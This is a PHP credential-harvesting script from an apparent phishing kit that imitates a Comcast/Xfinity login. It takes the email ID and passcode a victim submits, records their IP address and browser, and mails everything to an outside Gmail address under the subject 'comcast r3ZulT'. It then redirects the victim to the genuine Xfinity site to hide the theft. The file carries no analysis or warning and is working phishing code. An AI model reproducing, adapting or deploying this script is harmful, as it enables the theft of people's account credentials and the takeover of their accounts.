<?
$ip = getenv("REMOTE_ADDR");
$email = $_POST['UserId'];
$passwd = $_POST['Passcode'];
$datamasii=date("D M d, Y g:i a");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "-----------------Spam ReSulT--------------------\n
Email ID : $email
Passwdord: $passwd
-------------------------------------------------------------\n
Date     : $datamasii
Browser  : $browser
IP       : $ip
-----------------Spam ReSulT-----------------------------------\n";
$send = "wallacemartin2011@gmail.com";
$subject = "comcast r3ZulT";
$headers = "From: ReZult<logzz@cok.edu>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send",$subject,$message,$headers);
?>
<script>
    window.top.location.href = "http://my.xfinity.com/?cid=cust";

</script>